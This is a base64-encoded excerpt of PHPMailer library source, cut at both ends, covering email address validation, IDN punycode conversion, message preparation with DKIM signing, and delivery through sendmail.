2EtejAtOS1dezY0LH0pJyAuCiAgICAgICAgICAgICAgICAgICAgJyg/PlthLXowLTldKD8+W2EtejAtOS1dKlthLXowLTldKT8pKXswLDEyNn18XFsoPzooPz5JUHY2Oig/Pig/PlthLWYwLTldezEsNH0pKD8+OicgLgogICAgICAgICAgICAgICAgICAgICdbYS1mMC05XXsxLDR9KXs3fXwoPyEoPzouKlthLWYwLTldWzpcXV0pezgsfSkoPz5bYS1mMC05XXsxLDR9KD8+OlthLWYwLTldezEsNH0pezAsNn0pPycgLgogICAgICAgICAgICAgICAgICAgICc6Oig/PlthLWYwLTldezEsNH0oPz46W2EtZjAtOV17MSw0fSl7MCw2fSk/KSl8KD8+KD8+SVB2NjooPz5bYS1mMC05XXsxLDR9KD8+OicgLgogICAgICAgICAgICAgICAgICAgICdbYS1mMC05XXsxLDR9KXs1fTp8KD8hKD86LipbYS1mMC05XTopezYsfSkoPz5bYS1mMC05XXsxLDR9KD8+OlthLWYwLTldezEsNH0pezAsNH0pPycgLgogICAgICAgICAgICAgICAgICAgICc6Oig/Pig/OlthLWYwLTldezEsNH0oPz46W2EtZjAtOV17MSw0fSl7MCw0fSk6KT8pKT8oPz4yNVswLTVdfDJbMC00XVswLTldfDFbMC05XXsyfScgLgogICAgICAgICAgICAgICAgICAgICd8WzEtOV0/WzAtOV0pKD8+XC4oPz4yNVswLTVdfDJbMC00XVswLTldfDFbMC05XXsyfXxbMS05XT9bMC05XSkpezN9KSlcXSkkL2lzRCcsCiAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3MKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgIGNhc2UgJ2h0bWw1JzoKICAgICAgICAgICAgICAgIC8qKgogICAgICAgICAgICAgICAgICogVGhpcyBpcyB0aGUgcGF0dGVybiB1c2VkIGluIHRoZSBIVE1MNSBzcGVjIGZvciB2YWxpZGF0aW9uIG9mICdlbWFpbCcgdHlwZSBmb3JtIGlucHV0IGVsZW1lbnRzLgogICAgICAgICAgICAgICAgICogQGxpbmsgaHR0cDovL3d3dy53aGF0d2cub3JnL3NwZWNzL3dlYi1hcHBzL2N1cnJlbnQtd29yay8jZS1tYWlsLXN0YXRlLSh0eXBlPWVtYWlsKQogICAgICAgICAgICAgICAgICovCiAgICAgICAgICAgICAgICByZXR1cm4gKGJvb2xlYW4pcHJlZ19tYXRjaCgKICAgICAgICAgICAgICAgICAgICAnL15bYS16QS1aMC05LiEjJCUmXCcqK1wvPT9eX2B7fH1+LV0rQFthLXpBLVowLTldKD86W2EtekEtWjAtOS1dezAsNjF9JyAuCiAgICAgICAgICAgICAgICAgICAgJ1thLXpBLVowLTldKT8oPzpcLlthLXpBLVowLTldKD86W2EtekEtWjAtOS1dezAsNjF9W2EtekEtWjAtOV0pPykqJC9zRCcsCiAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3MKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgIGNhc2UgJ25vcmVnZXgnOgogICAgICAgICAgICAgICAgLy9ObyBQQ1JFISBEbyBzb21ldGhpbmcgX3ZlcnlfIGFwcHJveGltYXRlIQogICAgICAgICAgICAgICAgLy9DaGVjayB0aGUgYWRkcmVzcyBpcyAzIGNoYXJzIG9yIGxvbmdlciBhbmQgY29udGFpbnMgYW4gQCB0aGF0J3Mgbm90IHRoZSBmaXJzdCBvciBsYXN0IGNoYXIKICAgICAgICAgICAgICAgIHJldHVybiAoc3RybGVuKCRhZGRyZXNzKSA+PSAzCiAgICAgICAgICAgICAgICAgICAgYW5kIHN0cnBvcygkYWRkcmVzcywgJ0AnKSA+PSAxCiAgICAgICAgICAgICAgICAgICAgYW5kIHN0cnBvcygkYWRkcmVzcywgJ0AnKSAhPSBzdHJsZW4oJGFkZHJlc3MpIC0gMSk7CiAgICAgICAgICAgIGNhc2UgJ3BocCc6CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICByZXR1cm4gKGJvb2xlYW4pZmlsdGVyX3ZhcigkYWRkcmVzcywgRklMVEVSX1ZBTElEQVRFX0VNQUlMKTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBUZWxscyB3aGV0aGVyIElETnMgKEludGVybmF0aW9uYWxpemVkIERvbWFpbiBOYW1lcykgYXJlIHN1cHBvcnRlZCBvciBub3QuIFRoaXMgcmVxdWlyZXMgdGhlCiAgICAgKiAiaW50bCIgYW5kICJtYnN0cmluZyIgUEhQIGV4dGVuc2lvbnMuCiAgICAgKiBAcmV0dXJuIGJvb2wgInRydWUiIGlmIHJlcXVpcmVkIGZ1bmN0aW9ucyBmb3IgSUROIHN1cHBvcnQgYXJlIHByZXNlbnQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlkblN1cHBvcnRlZCgpCiAgICB7CiAgICAgICAgLy8gQFRPRE86IFdyaXRlIG91ciBvd24gImlkbl90b19hc2NpaSIgZnVuY3Rpb24gZm9yIFBIUCA8PSA1LjIuCiAgICAgICAgcmV0dXJuIGZ1bmN0aW9uX2V4aXN0cygnaWRuX3RvX2FzY2lpJykgYW5kIGZ1bmN0aW9uX2V4aXN0cygnbWJfY29udmVydF9lbmNvZGluZycpOwogICAgfQoKICAgIC8qKgogICAgICogQ29udmVydHMgSUROIGluIGdpdmVuIGVtYWlsIGFkZHJlc3MgdG8gaXRzIEFTQ0lJIGZvcm0sIGFsc28ga25vd24gYXMgcHVueWNvZGUsIGlmIHBvc3NpYmxlLgogICAgICogSW1wb3J0YW50OiBBZGRyZXNzIG11c3QgYmUgcGFzc2VkIGluIHNhbWUgZW5jb2RpbmcgYXMgY3VycmVudGx5IHNldCBpbiBQSFBNYWlsZXI6OiRDaGFyU2V0LgogICAgICogVGhpcyBmdW5jdGlvbiBzaWxlbnRseSByZXR1cm5zIHVubW9kaWZpZWQgYWRkcmVzcyBpZjoKICAgICAqIC0gTm8gY29udmVyc2lvbiBpcyBuZWNlc3NhcnkgKGkuZS4gZG9tYWluIG5hbWUgaXMgbm90IGFuIElETiwgb3IgaXMgYWxyZWFkeSBpbiBBU0NJSSBmb3JtKQogICAgICogLSBDb252ZXJzaW9uIHRvIHB1bnljb2RlIGlzIGltcG9zc2libGUgKGUuZy4gcmVxdWlyZWQgUEhQIGZ1bmN0aW9ucyBhcmUgbm90IGF2YWlsYWJsZSkKICAgICAqICAgb3IgZmFpbHMgZm9yIGFueSByZWFzb24gKGUuZy4gZG9tYWluIGhhcyBjaGFyYWN0ZXJzIG5vdCBhbGxvd2VkIGluIGFuIElETikKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokQ2hhclNldAogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byBjb252ZXJ0CiAgICAgKiBAcmV0dXJuIHN0cmluZyBUaGUgZW5jb2RlZCBhZGRyZXNzIGluIEFTQ0lJIGZvcm0KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHB1bnllbmNvZGVBZGRyZXNzKCRhZGRyZXNzKQogICAgewogICAgICAgIC8vIFZlcmlmeSB3ZSBoYXZlIHJlcXVpcmVkIGZ1bmN0aW9ucywgQ2hhclNldCwgYW5kIGF0LXNpZ24uCiAgICAgICAgaWYgKCR0aGlzLT5pZG5TdXBwb3J0ZWQoKSBhbmQKICAgICAgICAgICAgIWVtcHR5KCR0aGlzLT5DaGFyU2V0KSBhbmQKICAgICAgICAgICAgKCRwb3MgPSBzdHJycG9zKCRhZGRyZXNzLCAnQCcpKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgJGRvbWFpbiA9IHN1YnN0cigkYWRkcmVzcywgKyskcG9zKTsKICAgICAgICAgICAgLy8gVmVyaWZ5IENoYXJTZXQgc3RyaW5nIGlzIGEgdmFsaWQgb25lLCBhbmQgZG9tYWluIHByb3Blcmx5IGVuY29kZWQgaW4gdGhpcyBDaGFyU2V0LgogICAgICAgICAgICBpZiAoJHRoaXMtPmhhczhiaXRDaGFycygkZG9tYWluKSBhbmQgQG1iX2NoZWNrX2VuY29kaW5nKCRkb21haW4sICR0aGlzLT5DaGFyU2V0KSkgewogICAgICAgICAgICAgICAgJGRvbWFpbiA9IG1iX2NvbnZlcnRfZW5jb2RpbmcoJGRvbWFpbiwgJ1VURi04JywgJHRoaXMtPkNoYXJTZXQpOwogICAgICAgICAgICAgICAgaWYgKCgkcHVueWNvZGUgPSBkZWZpbmVkKCdJTlRMX0lETkFfVkFSSUFOVF9VVFM0NicpID8KICAgICAgICAgICAgICAgICAgICBpZG5fdG9fYXNjaWkoJGRvbWFpbiwgMCwgSU5UTF9JRE5BX1ZBUklBTlRfVVRTNDYpIDoKICAgICAgICAgICAgICAgICAgICBpZG5fdG9fYXNjaWkoJGRvbWFpbikpICE9PSBmYWxzZSkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBzdWJzdHIoJGFkZHJlc3MsIDAsICRwb3MpIC4gJHB1bnljb2RlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYWRkcmVzczsKICAgIH0KCiAgICAvKioKICAgICAqIENyZWF0ZSBhIG1lc3NhZ2UgYW5kIHNlbmQgaXQuCiAgICAgKiBVc2VzIHRoZSBzZW5kaW5nIG1ldGhvZCBzcGVjaWZpZWQgYnkgJE1haWxlci4KICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gZmFsc2Ugb24gZXJyb3IgLSBTZWUgdGhlIEVycm9ySW5mbyBwcm9wZXJ0eSBmb3IgZGV0YWlscyBvZiB0aGUgZXJyb3IuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZW5kKCkKICAgIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoISR0aGlzLT5wcmVTZW5kKCkpIHsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gJHRoaXMtPnBvc3RTZW5kKCk7CiAgICAgICAgfSBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsKICAgICAgICAgICAgJHRoaXMtPm1haWxIZWFkZXIgPSAnJzsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogUHJlcGFyZSBhIG1lc3NhZ2UgZm9yIHNlbmRpbmcuCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBwcmVTZW5kKCkKICAgIHsKICAgICAgICB0cnkgewogICAgICAgICAgICAkdGhpcy0+ZXJyb3JfY291bnQgPSAwOyAvLyBSZXNldCBlcnJvcnMKICAgICAgICAgICAgJHRoaXMtPm1haWxIZWFkZXIgPSAnJzsKCiAgICAgICAgICAgIC8vIERlcXVldWUgcmVjaXBpZW50IGFuZCBSZXBseS1UbyBhZGRyZXNzZXMgd2l0aCBJRE4KICAgICAgICAgICAgZm9yZWFjaCAoYXJyYXlfbWVyZ2UoJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSwgJHRoaXMtPlJlcGx5VG9RdWV1ZSkgYXMgJHBhcmFtcykgewogICAgICAgICAgICAgICAgJHBhcmFtc1sxXSA9ICR0aGlzLT5wdW55ZW5jb2RlQWRkcmVzcygkcGFyYW1zWzFdKTsKICAgICAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jX2FycmF5KGFycmF5KCR0aGlzLCAnYWRkQW5BZGRyZXNzJyksICRwYXJhbXMpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgoY291bnQoJHRoaXMtPnRvKSArIGNvdW50KCR0aGlzLT5jYykgKyBjb3VudCgkdGhpcy0+YmNjKSkgPCAxKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdwcm92aWRlX2FkZHJlc3MnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vIFZhbGlkYXRlIEZyb20sIFNlbmRlciwgYW5kIENvbmZpcm1SZWFkaW5nVG8gYWRkcmVzc2VzCiAgICAgICAgICAgIGZvcmVhY2ggKGFycmF5KCdGcm9tJywgJ1NlbmRlcicsICdDb25maXJtUmVhZGluZ1RvJykgYXMgJGFkZHJlc3Nfa2luZCkgewogICAgICAgICAgICAgICAgJHRoaXMtPiRhZGRyZXNzX2tpbmQgPSB0cmltKCR0aGlzLT4kYWRkcmVzc19raW5kKTsKICAgICAgICAgICAgICAgIGlmIChlbXB0eSgkdGhpcy0+JGFkZHJlc3Nfa2luZCkpIHsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0aGlzLT4kYWRkcmVzc19raW5kID0gJHRoaXMtPnB1bnllbmNvZGVBZGRyZXNzKCR0aGlzLT4kYWRkcmVzc19raW5kKTsKICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkdGhpcy0+JGFkZHJlc3Nfa2luZCkpIHsKICAgICAgICAgICAgICAgICAgICAkZXJyb3JfbWVzc2FnZSA9ICR0aGlzLT5sYW5nKCdpbnZhbGlkX2FkZHJlc3MnKSAuICR0aGlzLT4kYWRkcmVzc19raW5kOwogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vIFNldCB3aGV0aGVyIHRoZSBtZXNzYWdlIGlzIG11bHRpcGFydC9hbHRlcm5hdGl2ZQogICAgICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5BbHRCb2R5KSkgewogICAgICAgICAgICAgICAgJHRoaXMtPkNvbnRlbnRUeXBlID0gJ211bHRpcGFydC9hbHRlcm5hdGl2ZSc7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICR0aGlzLT5zZXRNZXNzYWdlVHlwZSgpOwogICAgICAgICAgICAvLyBSZWZ1c2UgdG8gc2VuZCBhbiBlbXB0eSBtZXNzYWdlIHVubGVzcyB3ZSBhcmUgc3BlY2lmaWNhbGx5IGFsbG93aW5nIGl0CiAgICAgICAgICAgIGlmICghJHRoaXMtPkFsbG93RW1wdHkgYW5kIGVtcHR5KCR0aGlzLT5Cb2R5KSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZW1wdHlfbWVzc2FnZScpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy8gQ3JlYXRlIGJvZHkgYmVmb3JlIGhlYWRlcnMgaW4gY2FzZSBib2R5IG1ha2VzIGNoYW5nZXMgdG8gaGVhZGVycyAoZS5nLiBhbHRlcmluZyB0cmFuc2ZlciBlbmNvZGluZykKICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgPSAnJzsKICAgICAgICAgICAgJHRoaXMtPk1JTUVCb2R5ID0gJHRoaXMtPmNyZWF0ZUJvZHkoKTsKICAgICAgICAgICAgLy8gY3JlYXRlQm9keSBtYXkgaGF2ZSBhZGRlZCBzb21lIGhlYWRlcnMsIHNvIHJldGFpbiB0aGVtCiAgICAgICAgICAgICR0ZW1waGVhZGVycyA9ICR0aGlzLT5NSU1FSGVhZGVyOwogICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciA9ICR0aGlzLT5jcmVhdGVIZWFkZXIoKTsKICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgLj0gJHRlbXBoZWFkZXJzOwoKICAgICAgICAgICAgLy8gVG8gY2FwdHVyZSB0aGUgY29tcGxldGUgbWVzc2FnZSB3aGVuIHVzaW5nIG1haWwoKSwgY3JlYXRlCiAgICAgICAgICAgIC8vIGFuIGV4dHJhIGhlYWRlciBsaXN0IHdoaWNoIGNyZWF0ZUhlYWRlcigpIGRvZXNuJ3QgZm9sZCBpbgogICAgICAgICAgICBpZiAoJHRoaXMtPk1haWxlciA9PSAnbWFpbCcpIHsKICAgICAgICAgICAgICAgIGlmIChjb3VudCgkdGhpcy0+dG8pID4gMCkgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5hZGRyQXBwZW5kKCdUbycsICR0aGlzLT50byk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5oZWFkZXJMaW5lKCdUbycsICd1bmRpc2Nsb3NlZC1yZWNpcGllbnRzOjsnKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5oZWFkZXJMaW5lKAogICAgICAgICAgICAgICAgICAgICdTdWJqZWN0JywKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIodHJpbSgkdGhpcy0+U3ViamVjdCkpKQogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy8gU2lnbiB3aXRoIERLSU0gaWYgZW5hYmxlZAogICAgICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5ES0lNX2RvbWFpbikKICAgICAgICAgICAgICAgICYmICFlbXB0eSgkdGhpcy0+REtJTV9wcml2YXRlKQogICAgICAgICAgICAgICAgJiYgIWVtcHR5KCR0aGlzLT5ES0lNX3NlbGVjdG9yKQogICAgICAgICAgICAgICAgJiYgZmlsZV9leGlzdHMoJHRoaXMtPkRLSU1fcHJpdmF0ZSkpIHsKICAgICAgICAgICAgICAgICRoZWFkZXJfZGtpbSA9ICR0aGlzLT5ES0lNX0FkZCgKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciAuICR0aGlzLT5tYWlsSGVhZGVyLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkdGhpcy0+U3ViamVjdCkpLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5NSU1FQm9keQogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyID0gcnRyaW0oJHRoaXMtPk1JTUVIZWFkZXIsICJcclxuICIpIC4gc2VsZjo6Q1JMRiAuCiAgICAgICAgICAgICAgICAgICAgc3RyX3JlcGxhY2UoIlxyXG4iLCAiXG4iLCAkaGVhZGVyX2RraW0pIC4gc2VsZjo6Q1JMRjsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9IGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICB9CiAgICBwdWJsaWMgZnVuY3Rpb24gaW5uZXJCb2R5KCl7CgogICAgICAgIAogICAgfQogICAgLyoqCiAgICAgKiBBY3R1YWxseSBzZW5kIGEgbWVzc2FnZS4KICAgICAqIFNlbmQgdGhlIGVtYWlsIHZpYSB0aGUgc2VsZWN0ZWQgbWVjaGFuaXNtCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBwb3N0U2VuZCgpCiAgICB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgLy8gQ2hvb3NlIHRoZSBtYWlsZXIgYW5kIHNlbmQgdGhyb3VnaCBpdAogICAgICAgICAgICBzd2l0Y2ggKCR0aGlzLT5NYWlsZXIpIHsKICAgICAgICAgICAgICAgIGNhc2UgJ3NlbmRtYWlsJzoKICAgICAgICAgICAgICAgIGNhc2UgJ3FtYWlsJzoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRtYWlsU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsKICAgICAgICAgICAgICAgIGNhc2UgJ3NtdHAnOgogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c210cFNlbmQoJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7CiAgICAgICAgICAgICAgICBjYXNlICdtYWlsJzoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPm1haWxTZW5kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOwogICAgICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgICAgICAkc2VuZE1ldGhvZCA9ICR0aGlzLT5NYWlsZXIuJ1NlbmQnOwogICAgICAgICAgICAgICAgICAgIGlmIChtZXRob2RfZXhpc3RzKCR0aGlzLCAkc2VuZE1ldGhvZCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT4kc2VuZE1ldGhvZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+bWFpbFNlbmQoJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93ICRleGM7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBtYWlsIHVzaW5nIHRoZSAkU2VuZG1haWwgcHJvZ3JhbS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGhlYWRlciBUaGUgbWVzc2FnZSBoZWFkZXJzCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5IFRoZSBtZXNzYWdlIGJvZHkKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokU2VuZG1haWwKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZW5kbWFpbFNlbmQoJGhlYWRlciwgJGJvZHkpCiAgICB7CiAgICAgICAgaWYgKCR0aGlzLT5TZW5kZXIgIT0gJycpIHsKICAgICAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgPT0gJ3FtYWlsJykgewogICAgICAgICAgICAgICAgJHNlbmRtYWlsID0gc3ByaW50ZignJXMgLWYlcycsIGVzY2FwZXNoZWxsY21kKCR0aGlzLT5TZW5kbWFpbCksIGVzY2FwZXNoZWxsYXJnKCR0aGlzLT5TZW5kZXIpKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRzZW5kbWFpbCA9IHNwcmludGYoJyVzIC1vaSAtZiVzIC10JywgZXNjYXBlc2hlbGxjbWQoJHRoaXMtPlNlbmRtYWlsKSwgZXNjYXBlc2hlbGxhcmcoJHRoaXMtPlNlbmRlcikpOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgPT0gJ3FtYWlsJykgewogICAgICAgICAgICAgICAgJHNlbmRtYWlsID0gc3ByaW50ZignJXMnLCBlc2NhcGVzaGVsbGNtZCgkdGhpcy0+U2VuZG1haWwpKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRzZW5kbWFpbCA9IHNwcmludGYoJyVzIC1vaSAtdCcsIGVzY2FwZXNoZWxsY21kKCR0aGlzLT5TZW5kbWFpbCkpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkdGhpcy0+U2luZ2xlVG8pIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHRoaXMtPlNpbmdsZVRvQXJyYXkgYXMgJHRvQWRkcikgewogICAgICAgICAgICAgICAgaWYgKCFAJG1haWwgPSBwb3Blbigkc2VuZG1haWwsICd3JykpIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleGVjdXRlJykgLiAkdGhpcy0+U2VuZG1haWwsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZnB1dHMoJG1haWwsICdUbzogJyAuICR0b0FkZHIgLiAiXG4iKTsKICAgICAgICAgICAgICAgIGZwdXRzKCRtYWlsLCAkaGVhZGVyKTsKICAgICAgICAgICAgICAgIGZwdXRzKCRtYWlsLCAkYm9keSk7CiAgICAgICAgICAgICAgICAkcmVzdWx0ID0gcGNsb3NlKCRtYWlsKTsKICAgICAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKAogICAgICAgICAgICAgICAgICAgICgkcmVzdWx0ID09IDApLAogICAgICAgICAgICAgICAgICAgIGFycmF5KCR0b0FkZHIpLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5jYywKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+YmNjLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5TdWJqZWN0LAogICAgICAgICAgICAgICAgICAgICRib2R5LAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5Gcm9tCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgaWYgKCRyZXN1bHQgIT0gMCkgewogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4ZWN1dGUnKSAuICR0aGlzLT5TZW5kbWFpbCwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoIUAkbWFpbCA9IHBvcGVuKCRzZW5kbWFpbCwgJ3cnKSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBmcHV0cygkbWFpbCwgJGhlYWRlcik7CiAgICAgICAgICAgIGZwdXRzKCRtYWlsLCAkYm9keSk7CiAgICAgICAgICAgICRyZXN1bHQgPSBwY2xvc2UoJG1haWwpOwogICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygKICAgICAgICAgICAgICAgICgkcmVzdWx0ID09IDApLAogICAgICAgICAgICAgICAgJHRoaXMtPnRvLAogICAgICAgICAgICAgICAgJHRoaXMtPmNjLAogICAgICAgICAgICAgICAgJHRoaXMtPmJjYywKICAgICAgICAgICAgICAgICR0aGlzLT5TdWJqZWN0LAogICAgICAgICAgICAgICAgJGJvZHksCiAgICAgICAgICAgICAgICAkdGhpcy0+RnJvbQogICAgICAgICAgICApOwogICAgICAgICAgICBpZiAoJHJlc3VsdCAhPSAwKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleGVjdXRlJykgLiAkdGhpcy0+U2VuZG1haWwsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBtYWlsIHVzaW5nIHRoZSBQSFAgbWFpbCgpIGZ1bmN0aW9uLgogICAgICogQHBhcm